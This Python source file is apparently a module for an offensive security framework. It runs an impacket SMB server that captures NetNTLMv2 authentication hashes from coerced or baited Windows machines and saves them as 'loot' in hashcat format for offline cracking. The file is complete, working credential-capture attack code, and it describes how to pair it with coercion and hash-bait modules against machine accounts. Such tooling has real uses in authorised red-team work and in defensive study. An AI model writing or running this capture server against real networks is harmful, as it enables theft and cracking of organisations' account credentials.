"""SMB capture: NetNTLMv2 hashes off the wire you coerce to yourself.

The capture half of the coercion play: an impacket SMB server that
answers authentication attempts, takes every NTLMv2 AUTHENTICATE
message it gets, and writes the hash out in hashcat mode-5600 format
(user::domain:challenge:ntproofstr:blob). Feed it with the coerce
module (LISTENER=this host) or hash_bait on a share, and machine
accounts hand you their NetNTLMv2 — crack offline, replay nowhere.

Server challenge is pinned to 1122334455667788 (the Responder
convention: deterministic hashes, comparable captures). Binding 445
needs root or CAP_NET_BIND_SERVICE — LPORT exists for lab/testing on
high ports. The forward-relay half (forward the auth to a target) is
ntlmrelayx's job; this module captures and stops there, and says so.
"""

import threading
import time

from core.module import AuxiliaryModule
from core.options import OptInt, OptPort, OptString

try:
    from impacket import smbserver
except ImportError:
    smbserver = None  # console gates run() on requirements


def netntlmv2_hash(challenge, user, domain, lanman, ntresp):
    """NetNTLMv2 in hashcat 5600 form: user::domain:challenge:proof:blob."""
    result = smbserver.outputToJohnFormat(challenge, user, domain,
                                          lanman, ntresp)
    return result.get("hash_string", "")


class SmbCapture(AuxiliaryModule):
    name = "SMB Capture (NetNTLMv2 server)"
    description = """
        Listens for inbound SMB authentication and captures NetNTLMv2
        hashes in hashcat 5600 format (loot type 'hash'). Feed it with
        coerce (LISTENER=this host) or hash_bait files on a share.
        Server challenge pinned to 1122334455667788. LPORT 445 needs
        root; use a high port for testing. Captures only — forwarding
        to a target is ntlmrelayx's job.
    """
    authors = ["you"]
    requirements = ["impacket"]

    def register_options(self):
        self.options.add(OptPort("LPORT", default=445,
                                 description="Port to listen on (445 needs "
                                             "root)"))
        self.options.add(OptInt("TIMEOUT", default=60,
                                description="Seconds to listen before "
                                            "returning"))
        self.options.add(OptString("CHALLENGE",
                                   default="1122334455667788",
                                   description="Server challenge, hex "
                                               "(Responder convention)"))

    def run(self):
        port = int(self.get_option("LPORT"))
        timeout = int(self.get_option("TIMEOUT"))
        challenge_hex = str(self.get_option("CHALLENGE"))
        try:
            bytes.fromhex(challenge_hex)  # format check only
        except ValueError:
            self.print_error(f"CHALLENGE must be hex: {challenge_hex}")
            return

        seen = set()
        server = smbserver.SimpleSMBServer(listenAddress="0.0.0.0",
                                           listenPort=port)
        server.setSMBChallenge(challenge_hex)  # the hex STRING, not bytes
        server.setSMB2Support(True)

        def on_auth(**kwargs):
            conn = kwargs["connData"]
            auth = conn.get("AUTHENTICATE_MESSAGE")
            if auth is None:
                return
            challenge_msg = conn["CHALLENGE_MESSAGE"]
            hash_string = netntlmv2_hash(
                challenge_msg["challenge"], auth["user_name"],
                auth["domain_name"], auth["lanman"], auth["ntlm"])
            if not hash_string or hash_string in seen:
                return
            seen.add(hash_string)
            user = kwargs["user_name"]
            domain = kwargs["domain_name"]
            self.print_good(f"{domain}\\{user} from "
                            f"{kwargs['host_name']}: captured NetNTLMv2")
            self.print_line(f"  {hash_string}")
            store = getattr(self.framework, "store", None)
            if store is not None:
                store.add_loot("hash", f"netntlmv2 {domain}\\{user}",
                               hash_string)

        server.setAuthCallback(on_auth)
        try:
            thread = threading.Thread(target=server.start, daemon=True)
            thread.start()
        except Exception as e:
            self.print_error(f"listen on {port} failed - {e}")
            return
        time.sleep(1)
        if not thread.is_alive():
            self.print_error(f"listen on {port} failed — root needed for "
                             f"low ports (or it's taken)")
            return
        self.print_status(f"listening on 0.0.0.0:{port} for {timeout}s "
                          f"(challenge {challenge_hex}) — coerce or bait "
                          f"toward this host")
        deadline = time.time() + timeout
        while time.time() < deadline:
            time.sleep(0.5)
        try:
            server.stop()
        except Exception:
            pass
        if not seen:
            self.print_status("no authentications captured")
        else:
            self.print_good(f"{len(seen)} unique NetNTLMv2 hash(es) "
                            f"captured — crack at leisure")
